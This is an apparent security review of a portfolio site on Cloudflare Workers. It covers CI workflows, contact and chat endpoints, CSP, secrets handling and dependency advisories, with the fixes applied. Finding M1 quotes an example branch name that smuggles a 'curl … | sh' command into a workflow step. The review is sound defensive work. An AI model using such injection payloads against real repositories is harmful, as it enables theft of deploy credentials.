# Security review — 2026-11-04

Branch `review/security-2026-11-04`. Scope: `apps/web` (Astro on Cloudflare Workers) and `packages/*`:
`/api/chat` and `lib/agent/*`, `/api/contact`, env handling, `public/_headers`, link/DOM sinks, GROQ,
GitHub workflows, `pnpm audit`. `apps/legacy-next` was read only for dependency findings.

Method: read every file in scope, grepped for DOM/HTML sinks, secret patterns (working tree and
history of tracked files), and GROQ string interpolation; ran `pnpm audit`; ran one credential-less
`apps/web` build to inspect `dist/`. No deploys, no pushes, `.env` never read.

**Verdict:** no critical or high issue in the shipped Worker. One CI script-injection (fixed), a
few medium abuse/blast-radius items, and a tail of low hardening.

## Medium

### M1. Script injection via `github.ref_name` — FIXED
`.github/workflows/deploy-web.yml` (preview step, was line ~85): `--message "${{ github.ref_name }} ${{ github.sha }}"`
inside a `run:` block. Git allows `$`, `(`, `)`, `;`, `"`, `|`, `&` in branch names, so pushing a branch
named like `x";curl${IFS}…|sh;"` would run in a step whose env holds `CLOUDFLARE_API_TOKEN`.
Needs push access to the repo (workflow triggers on `branches: ["**"]`), so the actor is a collaborator
or a stolen credential, but the result is the Cloudflare deploy token.
**Fix applied:** value goes through `env: REF_NAME` and is used as `"$REF_NAME"`.
**Remaining:** see M2.

### M2. Every branch push builds and uploads a Worker version with production secrets in reach
`deploy-web.yml:17-19` (`push: branches: ["**"]`), build step env `SANITY_API_TOKEN` (line ~58), upload step `CLOUDFLARE_API_TOKEN`.
`wrangler versions upload` creates a version of the *same* Worker, so a preview URL runs unreviewed branch
code with the production runtime secrets and bindings (`SMTP_TOKEN`, `RECAPTCHA_SECRET_KEY`, `SANITY_API_TOKEN`,
rate limiters). Anyone who can push a branch can read those by shipping code that echoes them, and
`/api/contact` on a preview URL sends real mail.
Impact: collaborator-level compromise escalates to all runtime secrets without touching `master`.
**Suggested fix:** limit preview uploads to `pull_request` from same-repo branches behind a required
environment approval, or give previews their own Worker name/secrets (`--name badger3000-web-preview`
with a separate read-only Sanity token and no SMTP token). Also require branch protection on `master`.
Not changed: it is a deliberate workflow design (PR #229) and an owner decision.

### M3. Contact auto-reply is an open mail relay to any address, with attacker-written text
`apps/web/src/pages/api/contact.ts:213-222`. After the owner mail succeeds, a "Thank you" mail is sent
**from the owner's domain** to whatever `email` the submitter typed, with `Dear ${name}` (up to 200 chars of
attacker text). Gates: reCAPTCHA v3 score >= 0.5 and 5 requests/min/IP.
Impact: backscatter and reputation damage for the Proton sending domain (spam/phishing flagging, SMTP token
throttled or revoked); the visitor never proves they own the address. Per-IP limits do not stop a
distributed run.
**Suggested fix (pick one):** drop the auto-reply; or send it only after confirming ownership; or make
the body fixed text with no submitter-supplied content and add a global (not per-IP) daily cap.

### M4. Chat: no global ceiling, limiter fails open, cache is bustable
`pages/api/chat.ts:47-49,107-117`, `lib/agent/memo.ts`.
- The only throttle is `CHAT_LIMITER` per IP (20/min) and it returns "not limited" on error or a missing binding.
- The memo key includes the visitor's terms, so unique words each cost 1-3 live Sanity reads that miss both the
  60 s memo and the Sanity CDN. A botnet at 20/min/IP burns the Sanity API quota (availability and cost, no data exposure).
- `cf-connecting-ip ?? "anon"` collapses a missing header into one shared bucket (only reachable off Cloudflare).
**Suggested fix:** a Cloudflare WAF rate-limiting rule or Turnstile in front of `/api/*` (zone setting, owner step);
optionally cap distinct `terms` queries per isolate per minute. The fail-open choice is documented and acceptable for a portfolio.

## Low

### L1. Card `href` from Sanity reached an anchor unvalidated — FIXED
`apps/web/src/lib/chat.ts:216-224`. `title.href = card.href` for any value; only the `target` branch checked `http`.
Card hrefs come from Sanity `url` fields (project, bookmark, testimonial, experience). The bookmark importer
(`packages/sanity/scripts/parse-bookmarks.mjs:17,37`) copies every `HREF` from a browser export, and browser
exports include `javascript:` bookmarklets. Today's `data/bookmarks.json` has none and the CSP (no `'unsafe-inline'`
in `script-src`) blocks `javascript:` navigation, so this was defence in depth.
**Fix applied:** only `/path` (not `//host`) and `http(s)://` are linked; the new-tab branch now keys on `https?:`.
**Still open (data layer):** same raw values go to `ExternalLink` in `BookmarkFolder.astro:52`, `TestimonialCard.astro:48`,
`TimelineEntry.astro:53`, `FeatureCard.astro`. Add `Rule.uri({scheme: ["http", "https"]})` to the `url` fields in
`packages/sanity/src/schema/parts/{bookmark,testimonials,experience,education,skillCategory}.js` (only
`articles.js` and `blockContent.js` have it) and make the importer skip non-http(s) links. A schema change
needs the studio deploy (owner step), so left alone.

### L2. Email regex is permissive
`contact.ts:45`: `^[^\s@]+@[^\s@.]+(?:\.[^\s@.]+)+$` allows `< > , ; " ( )` in the local part. CR/LF are excluded
(good), so there is no header or SMTP command injection, but a value like `a,b@x.com` lands in the `To:` and
`Reply-To:` headers as two mailboxes, and `RCPT TO: <…>` is built by string concatenation.
**Fix:** reject `[<>(),;:"\\\[\]]` in the local part, or validate with a stricter pattern.
Context: `worker-mailer@1.3.0` does **not** strip CRLF from headers (it only RFC 2047-encodes non-ASCII), so the
`name.replace(/[\r\n]+/g, " ")` on the subject (line 172) is load-bearing. Keep it, and keep any new header
value on the same path.

### L3. reCAPTCHA verdict: hostname not checked, no timeout
`contact.ts:120-137`. `verdict.hostname` is logged but not compared to `www.badger3000.com` / `badger3000.com`.
A token minted for another site that shares the key's allowed-domain list would verify. The `siteverify` and SMTP
calls have no `AbortSignal.timeout`, so a stalled Google or Proton connection holds the request until the Workers limit.
**Fix:** `if (!["www.badger3000.com","badger3000.com"].includes(verdict.hostname ?? "")) reject`, plus
`signal: AbortSignal.timeout(5000)` on the fetch. Preview URLs (`*.workers.dev`) would then fail the form, which
is probably what you want; allow-list them deliberately if not.

### L4. Workflow hygiene
- `blog-post-workflow.yml:13-19`: `SANITY_API_TOKEN` is set in **job** env, so the third-party
  `peter-evans/create-pull-request@v8` step (with `contents: write`) can read it. Move the env to the `update-readme`
  step only.
- Actions are pinned to major tags (`actions/checkout@v7`, `pnpm/action-setup@v6`, `peter-evans/create-pull-request@v8`),
  not commit SHAs. Pin at least the third-party one.
- `ci.yml` runs on `pull_request` with `contents: read` and no secrets: good. `deploy-web.yml` default permissions are
  `contents: read`: good.

### L5. `pnpm audit`: 18 advisories (8 high, 10 moderate, 0 critical), none reach the Worker
Packages: `undici` (<7.30.1, 9 advisories), `js-yaml` (<3.15.2, 5), `smol-toml` (<1.8.1, 3), `uuid` (<11.1.1), `minimatch` (<11.0.1).
Every path runs through `sanity` / `@sanity/cli` / `@module-federation/*` (Studio and CLI tooling) in `apps/legacy-next`,
`apps/studio` and `packages/sanity` devDependencies; `apps/web` sees only `undici@7.29.1` through the
`@badger3000/sanity` devDependency chain. A grep of the built Worker (`dist/server`) finds no `undici`, `js-yaml` or
`smol-toml` code (only a comment mentioning undici), so they affect developer machines and CI, not production.
**Fix:** `pnpm.overrides` in `pnpm-workspace.yaml` for `undici@>=7.30.1`, `js-yaml@>=3.15.2`, `smol-toml@>=1.8.1`,
`uuid@>=11.1.1`, `minimatch@>=11.0.1`, then `pnpm install` and re-run the Sanity CLI smoke test. Not applied: it rewrites
the lockfile across the workspace and `legacy-next` is frozen.

### L6. `verify-dist` coverage — FIXED
`apps/web/scripts/verify-dist.mjs:17` looked for `SANITY_API_TOKEN` only. Added `SMTP_TOKEN` and `RECAPTCHA_SECRET_KEY`
(both loaded from `.env` when present, same 8-char floor, values never printed).
Verified: `dist/server/.dev.vars` holds the token locally (reported, not failed). It sits in the Worker dir, which is not
uploaded as an asset directory; `dist/client/.assetsignore` lists `.dev.vars` and `wrangler.json` as a second guard.
`OWNER_EMAIL` is intentionally not scanned: the address is public on the site.

### L7. `SANITY_PREVIEW=drafts` is a one-variable data leak
`lib/sanity/client.ts:44`, `pages/api/chat.ts:38-41`. With the flag set on the production Worker, `/api/chat` serves
unpublished documents to anyone (the memo is bypassed so edits show instantly). It is secret-typed and opt-in, so this is
a config hazard, not a bug. **Suggestion:** never set it on the production Worker; if previews need it, set it only on a
separate preview Worker (ties to M2).

## Informational

- **CSP (`public/_headers`):** solid baseline: `default-src 'self'`, `object-src 'none'`, `base-uri 'self'`,
  `frame-ancestors 'self'`, script by hash, `/contact` has its own policy with `!` detaching the site one (no
  intersection surprises). Residual: `style-src 'unsafe-inline'` (Astro inlined CSS and gradient `style` attributes; fine);
  `/slidedeck/*` allows `'unsafe-inline'` scripts, `cdn.tailwindcss.com` and `img-src https:` without SRI (legacy
  deck, same-origin XSS surface only if the deck is edited); no `Cross-Origin-Opener-Policy`; HSTS lacks `preload`.
  The inline-script hash in the CSP must change with `Base.astro`'s theme script (documented in the file).
- **Caching:** `/_astro/*` immutable is right; API responses go through `json()` with `no-store` + `nosniff`;
  `/api/articles-feed` revalidates. Nothing user-specific is cacheable.
- **Resend:** not used. Mail goes over Proton SMTP via `worker-mailer@1.3.0`; credentials are `access: "secret"` env
  fields and the route returns 503 until all four required ones are set (logs names only, never values).
- **Env (ADR 0010):** only `PUBLIC_*` fields use `context: "client"`; `SANITY_API_TOKEN`, `SMTP_*`, `RECAPTCHA_SECRET_KEY`,
  `OWNER_EMAIL`, `SANITY_PREVIEW`, `CHAT_MODEL_TIER` are `server`/`secret`. The Sanity token is read inside `sanity()`
  (runtime), not at module scope. No `.env*` files tracked in the working tree except the two `.env.example`s; a pattern
  scan of tracked files finds no keys; `.env` is gitignored (see the history note below).
- **Adapter side effects:** the built `wrangler.json` adds a `SESSION` KV binding and `IMAGES` binding that
  `wrangler.jsonc` does not declare (Astro sessions / image service, unused). Harmless, but Cloudflare may auto-provision
  a KV namespace on first deploy. `upload_source_maps: true` sends source maps to Cloudflare (not public).
- **Cloudflare headers:** `cf-connecting-ip` is set by Cloudflare and cannot be spoofed on a proxied or `workers.dev` request.

## Checked and found sound

- **GROQ injection:** every user-derived value is a parameter (`$q`, `$limit`); the only `${}` interpolations in
  `packages/sanity/src/queries` are constant fragments (`IMAGE`, `FIGURE`, `BLOCKS`). `patterns()` (`retrieve.ts:99`)
  strips everything but letters, digits, `.` and `-`, so a term cannot carry `*` or another `match` wildcard; at most 5
  terms, message capped at 400 chars, body at 2 KB read from the stream (not just `content-length`).
- **Grounding / prompt injection:** the model (off by default) never receives the visitor's text, only facts built from
  Sanity (`compose.ts:289`). Output must clear `REJECT` patterns and the `isGrounded` allow-list (every content word
  and number must be in the facts), is cut to one sentence of <= 160 chars, and is bounded by a 2.5 s abort. The remaining
  injection surface is the content of Sanity documents, which the owner controls. Number words map to digits so a model
  cannot slip in an unbacked count.
- **DOM sinks:** the only `set:html` is the JSON-LD in `Seo.astro:92`, built from `JSON.stringify(...).replace(/</g, "\\u003c")`
  (no `</script>` breakout). No `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write` or `eval` anywhere in
  `apps/web/src` or `packages`. `chat.ts` fills templates with `textContent` only and clones them from `<template>`
  elements; the thread read back from `sessionStorage` goes through the same path (a tampered store can only change text).
- **Link rel:** `ExternalLink` and `Button` always add `noopener noreferrer`; `ContactForm.astro:105-106` has it by hand;
  `chat.ts` sets it; `portable/Link.astro` routes http(s) off-site links through `ExternalLink` and the schema restricts
  portable-text links to `http/https/mailto/tel`.
- **Contact HTML mail:** name, email, message, topic and timeline are HTML-escaped (and topic/timeline checked against the
  allow-lists in `contact-content.ts`); the plain-text part carries raw text, which is correct. Config 503 happens before
  body parsing; the rate limit runs before reading the body.
- **Secrets in git:** no tracked file matches key patterns. History (all refs) contains three non-example env paths from 2023:
  `template/web/.env.production` and `.env.development.template` (Gatsby `<# … #>` placeholders and an empty `SANITY_READ_TOKEN=""`,
  so nothing real) and `studio/.env.production` (commits `ac2fb19`, `98e878f`; the path resolves to a commit/gitlink object
  rather than a blob, so I could not read its contents). Suggested one-off: run `gitleaks detect` or `trufflehog git file://.` over
  the full history, and treat any Sanity token that was ever in a `studio/` env file as burned (rotate in sanity.io/manage).
- **CI:** `pull_request` workflow has no secrets and read-only permissions; the deploy workflow's `concurrency` keeps
  production deploys from being cancelled mid-upload.
- **Build artefacts:** `verify-dist` run after the review build reports the token not present in `dist/` outside `.dev.vars`.
